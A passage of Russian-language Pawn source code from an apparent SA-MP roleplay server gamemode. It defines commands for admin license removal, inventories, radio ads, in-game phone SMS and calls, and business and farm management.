		ShowPlayerDialog(playerid, D_LIC+1, 2, "Панель", "Отобрать водительские права\nОтобрать лицензию на судоходство\nОтобрать лицензию на полеты\nОтобрать лицензию на оружие", "Принять", "Отмена");
		SetPVarInt(playerid, "LicName", params[0]);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:atake(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /atake [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	ShowPlayerDialog(playerid, D_LIC+3, 2, "Панель", "Отобрать водительские права\nОтобрать лицензию на судоходство\nОтобрать лицензию на полеты\nОтобрать лицензию на оружие\nОтобрать паспорт\nОтобрать мед. карту", "Принять", "Отмена");
	SetPVarInt(playerid, "LicName", params[0]);
	return 1;
}

CMD:radio(playerid, params[])
{
	ShowPlayerDialog(playerid, D_NMENU+3, 2, "Радио", "Станция: Ритм\n{AFAFAF}Выключить", "Принять", "Отмена");
	return 1;
}

CMD:inv(playerid)
{
    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "В тюрьме инвентарь недоступен!");
    ShowInventory(playerid);
    return 1;
}

CMD:giveitem(playerid, params[])
{
    if(PI[playerid][pAdmin] < 6) return 1;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new targetPlayerId, item, count;
	if(sscanf(params, "ddd", targetPlayerId, item, count)) return SendClientMessage(playerid, 0xf6e58dAA, "Используйте: {ffffff}Введите: /giveitem [playerid] [Item] Количество");
	if(count > 5) return SendClientMessage(playerid, 0xffffffAA, "Нельзя выдавать за раз больше 5 предметов");
	new str[132];
	GiveItem(targetPlayerId, item, count);
	ShowInventory(targetPlayerId);
	format(str, sizeof str, "%s получил предмет (%d) в количестве(%d)", GetName(targetPlayerId), Item[item][iName], count);
	SendClientMessage(playerid, -1, str);
	return true;
}

CMD:checkinv(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 4) return 1;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
    if(sscanf(params, "i",params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /checkinv [playerid]");
	new num,string[900];
	for(new s = 16; s > 0; s --)
	{
 		if(PlayerItem1[params[0]][s]==0)continue;
		if(PlayerItem1[params[0]][s]>0)
  		{
    		new id=PlayerItem1[params[0]][s];
			PlayerUseList[playerid][num]=s;
			num++;
			if(Item[id][iStek]==1){format(string,sizeof(string),"%s{808080}[%iг] {FFFFFF}%s (%i шт)\n",string,PlayerItem2[params[0]][s]*Item[id][iGG],Item[id][iName],PlayerItem2[params[0]][s]);}
   			else
			{
   				switch(PlayerItem1[params[0]][s])
			    {
       				case 126:format(string,sizeof(string),"%s{808080}[%iг] {FFFFFF}%s (номер: %s)\n",string,Item[id][iGG],Item[id][iName],PlayerItem3[params[0]][s]);
				    default:format(string,sizeof(string),"%s{808080}[%iг] {FFFFFF}%s\n",string,Item[id][iGG],Item[id][iName]);
			    }
			}
	    }
	}
	if(num > 0)
	{
	    SetPVarInt(playerid,"IDplayaInv",params[0]);
	    new str[62];
	    format(str,sizeof(str),"{FFFFFF} Инвентарь {808080}%s",GetName(params[0]));
		ShowPlayerDialog(playerid, D_INVENT+10, DIALOG_STYLE_LIST, str, string, "Выбрать", "Выйти");
	}
	else SendClientMessage(playerid,COLOR_GREY,"Инвентарь пустой!");
	return true;
}

CMD:unammo(playerid, params[])
{
    if(IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_GREY,"Вы не можете разрядить оружие в машине!");
    ResetPlayerWeapons(playerid);
    SendClientMessage(playerid,COLOR_GREY,"Вы разрядили всё оружие");
    if(PI[playerid][pSex] == 1) MeAction(playerid, "разрядил оружие");
	else MeAction(playerid, "разрядила оружие");
	return true;
}
CMD:news(playerid, params[])
{
	if(!IsANews(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(IsPlayerInAnyVehicle(playerid))
	{
		new full = 0;
		for(new i = TOTALVEH; i > 0; i --)
		{
		    if(PI[playerid][pMember] == TEAM_SMI)
		    {
				if(VehInfo[i][vVehicle] == GetPlayerVehicleID(playerid) && (i >= 82 && i <= 88))
				{
					NewsPanel(playerid);
					full++;
					break;
				}
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в офисе или служебном транспорте!");
	}
	else
	{
	    if(IsPlayerInRangeOfPoint(playerid, 100.0, -96.1380,453.6070,3013.1499)) NewsPanel(playerid);
	    else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в офисе или служебном транспорте!");
	}
	return 1;
}

CMD:ad(playerid, params[])
{
	new string[128];
	if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(PI[playerid][pTime] < 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны играть на сервере более 2 часов!");
	else if(PI[playerid][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет SIM-карты!");
	else if(PI[playerid][pNews] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны быть переключены на какую-либо станцию (/radio)");
	else if(TOTALADVERT[PI[playerid][pNews]-1] >= 15) return SendClientMessage(playerid, COLOR_GREY, "Линия заполнена, обратитесь позже!");
	else if(AdvertTime_ > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Посылать объявление можно раз в минуту!");
	else if(sscanf(params, "s[128]", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /ad [текст]");
	else if(GetMoney(playerid) < strlen(params[0])*AdvertPrice[PI[playerid][pNews]-1]) return SendMess(playerid, MSG_NOT_MONEY);
	TOTALADVERT[PI[playerid][pNews]-1]++;
	strmid(AdvertInfo[TOTALADVERT[PI[playerid][pNews]-1]][PI[playerid][pNews]-1][aText],params[0],0,strlen(params[0]),128);
	strmid(AdvertInfo[TOTALADVERT[PI[playerid][pNews]-1]][PI[playerid][pNews]-1][aName],GetName(playerid),0,strlen(GetName(playerid)),MAX_PLAYER_NAME);
	AdvertInfo[TOTALADVERT[PI[playerid][pNews]-1]][PI[playerid][pNews]-1][aPhone] = PI[playerid][pPhoneNumber];
	GiveMoney(playerid, -strlen(params[0]) * AdvertPrice[PI[playerid][pNews]-1]);
	if(PI[playerid][pNews] == 1)
	{
		FracBank[8] += strlen(params[0]) * AdvertPrice[PI[playerid][pNews]-1];
		MysqlUpdateOtherInt("lsnbank", FracBank[8]);
	}
	if(PI[playerid][pNews] == 2)
	{
		FracBank[9] += strlen(params[0]) * AdvertPrice[PI[playerid][pNews]-1];
		MysqlUpdateOtherInt("sfnbank", FracBank[9]);
	}
	if(PI[playerid][pNews] == 3)
	{
		FracBank[10] += strlen(params[0]) * AdvertPrice[PI[playerid][pNews]-1];
		MysqlUpdateOtherInt("lvnbank", FracBank[10]);
	}
	SendClientMessage(playerid, COLOR_LIGHTRED, "Ваше объявление было отправлено на обработку");
	SendFMes(18, COLOR_LIME, "В редакцию поступило новое объявление!");
	format(string, sizeof(string), "~r~Цена %dр~n~~w~Содержащиеся сообщение: %d символа", strlen(params[0]) * AdvertPrice[PI[playerid][pNews]-1], strlen(params[0]));
	GameTextForPlayer(playerid, string, 5000, 5);
	AdvertTime_ = gettime() + 60;
	return 1;
}

CMD:npanel(playerid, params[])
{
    if(IsANews(playerid) && PI[playerid][pLeader]) ShowPlayerDialog(playerid, D_NMENU+4, 2, "Панель", "- Установить цену за звонок\n- Установить цену за СМС\n- Установить цену за объявление", "Принять", "Отмена");
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:mpanel(playerid, params[])
{
    if(IsAMayor(playerid))
    //if(GetString(GetName(playerid), NGA1) || GetString(GetName(playerid), NGA2))
    {
		switch(PI[playerid][pRank])
		{
			case 6:
			{
				ShowPlayerDialog(playerid, D_RADAR+1, 2, "Панель МВД", "- Установить цену за 1 превышенный км. (Радары)", "Принять", "Отмена");
			}
			case 7:
			{
				ShowPlayerDialog(playerid, D_HOME+6, 2, "Панель Мин. здравоохранения", "- Установить цену лечения", "Принять", "Отмена");
			}
			case 10:
			{
				ShowPlayerDialog(playerid, D_NMENU+12, 2, "Панель Президента", "\
				- Установить цену гос. налога\n- Установить цену освобождение из тюрьмы\n\
				- Установить цену за получение паспорта\n- Контролировать зарплату в организациях", "Принять", "Отмена");
			}
	 	}
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}
CMD:sms(playerid, params[])
{
    if(PI[playerid][pPhoneBalance] < 1) return SendClientMessage(playerid, COLOR_RED, "У Вас недостаточно денег!");
    if(PI[playerid][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_RED, "У Вас нет телефона!");
    if(PI[playerid][pMuted] > 0) return SendClientMessage(playerid, 0xff6600AA, "У Вас затычка. Узнать подробней: /time");
	else if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_RED, "У Вас изъяли телефон!");
	else if(pCuff[playerid][pCuffee] == playerid) return SendClientMessage(playerid, COLOR_RED, "На Вас надеты наручники!");
   	else if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_RED, "Вы разговариваете по телефону!");
   	else if(!Phone[playerid]) return SendClientMessage(playerid, COLOR_RED, "У Вас выключен телефон!");
    else if(sscanf(params, "ds[100]", params[0], params[1])) return SendClientMessage(playerid, COLOR_LIME, "• Информация: {ffffff}/sms [номер] [текст]");
	else if(!(100 <= params[0] <= 9999999)) return SendClientMessage(playerid, COLOR_RED, "Неверный номер телефона!");
	else if(params[0] == PI[playerid][pPhoneNumber]) return SendClientMessage(playerid, COLOR_RED, "Ты не можешь писать смс самому себе!");
	else if(IsAIP(params[1])) return 0;
	new nidx = -1, plidx = -1;
	foreach(new i: Player)
	{
	    if(!IsPlayerConnected(i) || !PlayerLogged[i]) continue;
	    if(params[0] == 555 || params[0] == 666 || params[0] == 777)
	    {
	    	nidx = i;
	    	break;
    	}
    	else if(params[0] == PI[i][pPhoneNumber])
 	    {
 	        plidx = i;
 	        break;
 	    }
 	}
 	new string[200];
 	if(nidx > -1)
 	{
 	    new select_radio = (params[0] == 555)?(1):(params[0] == 666)?(2):(3);
		if(PI[playerid][pNews] != select_radio) return SendClientMessage(playerid, COLOR_RED, "Вы должны переключиться на волну этой студии!");
 	    else if(!Ether[nidx] && PI[nidx][pMember] == PI[playerid][pNews]+17) return SendClientMessage(playerid, COLOR_RED, "[Ошибка] Радио не принимает СМС!");
 	    new news_name[24];
 	    news_name = (PI[playerid][pNews] == 1)?("ТРК Амазинг Тел.: 555"):(PI[playerid][pNews] == 2)?("Закрыто Тел.: 666"):("Закрыто Тел.: 777");
 	    if(!EtherSms[PI[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_RED, "Радио не принимает СМС!");
    	if(PI[playerid][pPhoneBalance] < SmsPrice[PI[playerid][pNews]-1]) return SendClientMessage(playerid, COLOR_RED, "На Вашем счету в банке недостаточно денег!");
		PI[playerid][pPhoneBalance] -= SmsPrice[PI[playerid][pNews]-1];
        FracBank[PI[playerid][pNews]+7] += SmsPrice[PI[playerid][pNews]-1];
        //PlayerPlaySound(nidx, 1052, 0.0, 0.0, 0.0);
		//PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "SMS: %s | Отправитель: %s [т.%i]", params[1], GetName(playerid), PI[playerid][pPhoneNumber]);
		SendClientMessage(nidx, 0xFFCC00FF, string);
		format(string, sizeof(string), "SMS: %s | Получатель: %s", params[1], news_name);
		SendClientMessage(playerid, 0xFFCC00FF, string);
		SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
		MeAction(playerid, "достаёт мобильный телефон");
		SetPlayerChatBubble(playerid, (PI[playerid][pSex] == 1)?("Отправил СМС"):("Отправила СМС"), COLOR_YELLOW, 13.0, 10000);
 	}
 	else if(plidx > -1)
 	{
 	    if(!Phone[plidx]) return SendClientMessage(playerid, COLOR_RED, "Игрок выключил телефон!");
	    if(PI[plidx][pJail] > 0) return SendClientMessage(playerid, COLOR_RED, "Абонент временно недоступен!");
		//PlayerPlaySound(plidx, 1052, 0.0, 0.0, 0.0);
		//PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "SMS: %s | Отправитель: %s [т.%i]", params[1], GetName(playerid), PI[playerid][pPhoneNumber]);
		SendClientMessage(plidx, 0xFFCC00FF, string);
		format(string, sizeof(string), "SMS: %s | Получатель: %s [т.%i]", params[1], GetName(plidx), PI[plidx][pPhoneNumber]);
		SendClientMessage(playerid, 0xFFCC00FF, string);
		/*foreach(new x:Player)
		{
			if(AdminInfo[x][admSmsEars])
			{
			    format(string, sizeof(string), "[SMS] %s | Отправил %s [%i] для %s [%i]", params[1], GetName(playerid), playerid, GetName(plidx), plidx);
			    SendClientMessage(x, COLOR_YELLOW, string);
			}
		}
		foreach(new x:Player)
		{
			if(AdminInfo[x][fsbSmsEars])
			{
			    format(string, sizeof(string), "[SMS] %s | Отправил %s [%i] для %s [%i]", params[1], GetName(playerid), playerid, GetName(plidx), plidx);
			    SendClientMessage(x, 0x54b367FF, string);
			}
		}*/
		PI[playerid][pPhoneBalance] -= 10;
		SendClientMessage(playerid, COLOR_WHITE, "Ваше сообщение доставлено");
		MeAction(playerid, "достаёт мобильный телефон");
		SetPlayerChatBubble(playerid, (PI[playerid][pSex] == 1)?("Отправил СМС"):("Отправила СМС"), COLOR_YELLOW, 13.0, 10000);
 	}
 	else SendClientMessage(playerid, COLOR_RED, "Указанный Вами номер не существует!");
	return 1;
}

CMD:c(playerid, params[]) return callcmd::call(playerid, params);
CMD:call(playerid, params[])
{
	if(PI[playerid][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_RED, "У Вас нет телефона!");
	if(PI[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_RED, "У Вас затычка. Узнать подробней: /time");
	if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_RED, "Вы уже разговариваете по телефону");
	if(Phone[playerid] == false) return SendClientMessage(playerid, COLOR_RED, "У Вас выключен телефон");
	if(Ether[playerid] == true) return SendClientMessage(playerid, COLOR_RED, "Действие невозможно");
	if(sscanf(params, "d", params[0]))
	{
		SendClientMessage(playerid, COLOR_LIME, "• Информация: {ffffff}/call [номер]");
		return 1;
	}
	if(!(1 <= params[0] <= 9999999)) return SendClientMessage(playerid, COLOR_RED, "Неверный номер телефона");
	if(params[0] == PI[playerid][pPhoneNumber]) return SendClientMessage(playerid, COLOR_RED, "Ты не можешь позвонить самому себе");
	if(PI[playerid][pPhoneBalance] < 1) return SendClientMessage(playerid, COLOR_RED, "У Вас недостаточно денег!");
	new fullphone;
	if(params[0] == 911)
	{
		return ShowPlayerDialog(playerid, D_HEAL+3, 2, "{FFCC00}Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
	}
	foreach(new i: Player)
	{
		if(params[0] == PI[i][pPhoneNumber] && PlayerLogged[i] == true)
	{
		if(Phone[i] == false) return SendClientMessage(playerid, COLOR_FADE1, "Абонент вне зоны действия сети");
		if(Ether[i] == true) return SendClientMessage(playerid, COLOR_FADE1, "Действие невозможно");
		if(Mobile[i] != -1) return SendClientMessage(playerid, COLOR_FADE1, "Абонент уже разговаривает по телефону");
		Mobile[playerid] = i;
		SendMes(i, COLOR_BLUE, "Входящий звонок | Номер: {ffffff}%i {1e90ff}| Вызывает: {ffffff}%s", PI[playerid][pPhoneNumber], GetName(playerid));
		SendClientMessage(i, COLOR_WHITE, "Используйте {03c03c}/p {ffffff}чтобы ответить или {ff7518}/h {ffffff}чтобы отклонить вызов");
		PlayerPlaySound(i, 23000, 0.0, 0.0, 0.0);
		PlayerPlaySound(playerid, 3600, 0.0, 0.0, 0.0);
		if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, 11);
		CellTime[playerid] = 0;
		fullphone++;
	}
}
	if(fullphone == 0) return SendClientMessage(playerid, COLOR_RED, "Игрок с этим номером не найден");
	return 1;
}
CMD:p(playerid) return callcmd::pickup(playerid);
CMD:pickup(playerid)
{
	if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже разговариваете по телефону!");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(Mobile[i] == playerid)
		{
			if(Ether[playerid] == true) CallNews[PI[playerid][pNews]-1]++, EtherCalled[i] = true;
			Mobile[playerid] = i;
			SendMes(i, COLOR_GRAD2, "%s поднял трубку мобильного", GetName(playerid));
			PI[i][pPhoneBalance] -= 10;
			MysqlUpdatePlayerInt(i, "phonebalance", PI[i][pPhoneBalance]);
			MeAction(playerid, "ответил на звонок");
			if(!IsPlayerInAnyVehicle(playerid)) SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			return 1;
		}
	}
	return 1;
}

CMD:h(playerid) return callcmd::hangup(playerid);
CMD:hangup(playerid)
{
	if(Mobile[playerid] == -1) return SendClientMessage(playerid, COLOR_GREY, "Вы не разговариваете по телефону!");
	new callerid = Mobile[playerid];
	SendClientMessage(callerid, COLOR_GRAD2, "Абонент положил трубку");
	SetPlayerSpecialAction(callerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	CellTime[callerid] = -1;
	CellTime[playerid] = -1;
	Mobile[callerid] = -1;
	if(EtherCalled[playerid] == true) EtherCalled[playerid] = false;
	if(EtherCalled[callerid] == true) EtherCalled[callerid] = false;
	SendClientMessage(playerid,  COLOR_GRAD2, "Вы положили трубку");
	Mobile[playerid] = -1;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
	DeletePVar(playerid, "CallTime");
	DeletePVar(callerid, "CallTime");
	return 1;
}

CMD:togphone(playerid, params[])
{
    if(PI[playerid][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет телефона или SIM-карты!");
    if(Phone[playerid])
    {
        Phone[playerid] = false;
        SendClientMessage(playerid, COLOR_RED, "Вы выключили телефон");
        SetPlayerChatBubble(playerid, "выключил телефон", COLOR_PURPLE, 13.0, 10000);
    }
    else
    {
        Phone[playerid] = true;
        SendClientMessage(playerid, COLOR_GREEN, "Вы включили телефон");
        SetPlayerChatBubble(playerid, "включил телефон", COLOR_PURPLE, 13.0, 10000);
    }
	return 1;
}

CMD:number(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /number [id/имя игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pPhoneNumber] <= 1) return SendClientMessage(playerid, COLOR_GREY, "Игрок не владеет телефоном или у него нет SIM-карты!");
	new string[128];
	format(string, sizeof(string), "Номер игрока %s[%d]: {33CCFF}%i", GetName(params[0]), params[0], PI[params[0]][pPhoneNumber]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:bpanel(playerid)
{
	if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
	ShowPlayerDialog
	(
		playerid, D_HEAL+10, 2,
		"Панель управления бизнесом",
		"{0099FF}1. {FFFFFF}Информация о бизнесе\n\
		{0099FF}2. {FFFFFF}Открыть/Закрыть бизнес\n\
		{0099FF}3. {FFFFFF}Установить цену за товар\n\
		{0099FF}4. {FFFFFF}Установить цену за вход\n\
		{0099FF}5. {FFFFFF}Продать бизнес\n\
		{0099FF}6. {FFFFFF}Заказать продукты",
		"Принять", "Отмена");
	return 1;
}
CMD:abizzinfo(playerid)
{
	if(PI[playerid][pAdmin] < 7) return 1;

	STRING_GLOBAL[0] = EOS;
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(BizzInfo[i][bName][0] == EOS)
			continue;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s%d. %s (id - %d). Владелец: %s\n", STRING_GLOBAL, i, BizzInfo[i][bName], i, BizzInfo[i][bOwner]);
	}
	ShowPlayerDialog(playerid, DLG_ADM_BIZZ_MENU, DIALOG_STYLE_LIST, "Меню управления бизнесами", STRING_GLOBAL, "Выбрать", "Закрыть");
	return 1;
}
CMD:cancelorder(playerid)
{
	if(GetPlayerBizz(playerid) == 0)
		return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом");

	new Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT contractor, price FROM orders WHERE business=%d", GetPVarInt(playerid, "PlayerBizz"));
	result = mysql_query(dbHandle, STRING_GLOBAL);
	printf("%s", STRING_GLOBAL);

	if(cache_num_rows())
	{
		new contractor = cache_get_field_content_int(0, "contractor"),
			price = cache_get_field_content_int(0, "price");

		GiveMoney(playerid, price);

		SendClientMessage(playerid, C_BLUE, "Вы успешно отменили свой заказ, Вам была возвращена вся сумма");

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM orders WHERE business=%d AND contractor=%d", GetPVarInt(playerid, "PlayerBizz"), contractor);
		mysql_query(dbHandle, STRING_GLOBAL);

		foreach(new i: Player)
		{
			if(PI[i][pID] != contractor)
				return 1;

			SendClientMessage(i, C_BLUE, "К сожалению Ваш заказ был отменен");

			PI[i][P_ORDER_BIZ_ID]				=
			PI[i][P_ORDER_TIME]					=
			PI[i][P_ORDER_ID]					= -1;

			DisablePlayerRaceCheckpoint(i);
		}
	}
	else SendClientMessage(playerid, C_RED, "Заказ для Вашего бизнеса отсутствует");

	cache_delete(result);


	return 1;
}

CMD:setbizprod(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 6) return 1;
    else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setbizprod [количество продуктов]");
	for(new idx = TOTALBIZZ; idx > 0; idx --)
	{
		if(IsPlayerInRangeOfPoint(playerid, 4.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			BizzInfo[idx][bProduct] = params[0];
			MysqlUpdateBizzInt(idx, "product", params[0]);
			SendMes(playerid, COLOR_WHITE, "Вы заменили бизнесу %s продуктов на %d",BizzInfo[idx][bName], BizzInfo[idx][bProduct]);
		}
	}
	return 1;
}

CMD:buyferm(playerid)
{
	if(strcmp(GetFermData(F_OWNER), "None"))
		return SendClientMessage(playerid, C_RED, "У фермы уже есть владелец");

	if(!IsPlayerInDynamicArea(playerid, AreaFerm))
		return SendClientMessage(playerid, C_RED, "Вы находитесь далеко от фермы");

	if(GetMoney(playerid) < GetFermData(F_COST))
		return SendMess(playerid, MSG_NOT_MONEY);

	GiveMoney(playerid, -GetFermData(F_COST));

	g_ferm_info[F_OWNER] = EOS;
	strcat(g_ferm_info[F_OWNER], GetName(playerid));

	g_ferm_info[F_BANK] = 500;
	g_ferm_info[F_PAY] = 1;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET owner='%s'", GetFermData(F_OWNER));
	mysql_query(dbHandle, STRING_GLOBAL);

	SendClientMessage(playerid, C_BLUE, "Вы успешно приобрели ферму.");

	UpdateFermLabel();

	return 1;
}

CMD:fmenu(playerid)
{
	if(strcmp(GetFermData(F_OWNER), GetName(playerid)) && strcmp(GetFermData(F_SUB), GetName(playerid)))
		return SendClientMessage(playerid, C_RED, "Вы не владелец/заместитель на ферме");

	new sub[MAX_PLAYER_NAME];

	sub = "{FFCC00}Отсутствует";

	if(strcmp(g_ferm_info[F_SUB], "None")) format(sub, sizeof sub, "{ff614a}%s", GetFermData(F_SUB));

	new interaction[30];

	if(strcmp(GetFermData(F_SUB), GetName(playerid))) interaction = "Продать ферму";
	else interaction = "Покинуть пост заместителя";

	STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{FFCC00}1. {FFFFFF}Статистика фермы\n"\
		"{FFCC00}2. {FFFFFF}%s бизнес\n"\
		"{FFCC00}3. {FFFFFF}Заместитель: %s\n"\
		"{FFCC00}4. {FFFFFF}Настройка зарплат\n"\
		"{FFCC00}5. {FFFFFF}Снять деньги\n"\
		"{FFCC00}6. {FFFFFF}Пополнить деньги\n"\
		"{FFCC00}7. {FFFFFF}%s",
		GetFermData(F_LOCK) == 1 ? "{66cc00}Открыть" : "{ff614a}Закрыть",
		sub,
		interaction
	);

	ShowPlayerDialog
	(
		playerid, DIALOG_FERM_MENU, DIALOG_STYLE_LIST,
		"{FFCC00}Меню фермы",
		STRING_GLOBAL,
		"Далее", "Отмена"
	);

	return 1;
}

CMD:fsub(playerid, params[])
{
	if(strcmp(GetFermData(F_OWNER), GetName(playerid)))
		return SendClientMessage(playerid, C_RED, "Вы не владелец фермы");

	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /fsub [ид игрока]");

	extract params -> new to_player;

	if(strcmp(GetFermData(F_SUB), "None"))
		return SendClientMessage(playerid, C_RED, "На ферме уже есть заместитель");

	g_ferm_info[F_SUB] = EOS;
	strcat(g_ferm_info[F_SUB], GetName(to_player));

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно назначили %s заместителем на ферме", GetFermData(F_SUB));
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s назначил Вас заместителем на ферме", GetName(playerid));
	SendClientMessage(to_player, C_BLUE, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET sub='%s'", GetFermData(F_SUB));
	mysql_query(dbHandle, STRING_GLOBAL);

	UpdateFermLabel();

	return 1;
}

CMD:funsub(playerid, params[])
{
	if(strcmp(GetFermData(F_OWNER), GetName(playerid)))
		return SendClientMessage(playerid, C_RED, "Вы не владелец фермы");

	if(strcmp(GetFermData(F_SUB), "None"))
		return SendClientMessage(playerid, C_RED, "На нет заместителя заместитель");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно сняли заместителя %s на ферме", GetFermData(F_SUB));
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	g_ferm_info[F_SUB] = EOS;
	strcat(g_ferm_info[F_SUB], "None");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET sub='%s'", GetFermData(F_SUB));
	mysql_query(dbHandle, STRING_GLOBAL);

	UpdateFermLabel();

	return 1;
}

CMD:buybiz(playerid, params[])
{
	if(GetPlayerBizz(playerid) == 1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже владеете бизнесом!");
	if(PI[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Для покупки бизнеса, необходимо иметь 3 игровой уровень!");

	new full, full_;
	for(new idx = TOTALBIZZ; idx > 0; idx --)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
		{
			full++;
			if(!strcmp(BizzInfo[idx][bOwner],"None",true))
			{
				full_++;
				if(PI[playerid][pCash] < BizzInfo[idx][bPrice]) return SendMess(playerid, MSG_NOT_MONEY);
				else
				{
					GiveMoney(playerid, -BizzInfo[idx][bPrice]);
					BizzInfo[idx][bBuyPrice] = BizzInfo[idx][bPrice] / 2;
					BizzInfo[idx][bProduct] = 100;
					BizzInfo[idx][bMoney] = BizzInfo[idx][bBuyPrice] / 8000;
					BizzInfo[idx][bEnter] = 0;
					BizzInfo[idx][bTill] = 50;
					BizzInfo[idx][bOplata] = 1;
					SendMes(playerid, COLOR_GREEN, "Вы купили бизнес %s за %iр. У Вас осталось: %iр", BizzInfo[idx][bName], BizzInfo[idx][bPrice], PI[playerid][pCash]);
					SendClientMessage(playerid, COLOR_YELLOW, "Аренда бизнеса оплачена на 1 день, не забывайте регулярно следить за его оплатой.");
					SendClientMessage(playerid, COLOR_YELLOW, "Приобретите лицензию на Ваш бизнес, если в течении 12 часов этого не будет, он будет продан государству!");
					strmid(BizzInfo[idx][bOwner],GetName(playerid), 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);

                    STRING_GLOBAL[0] = EOS;
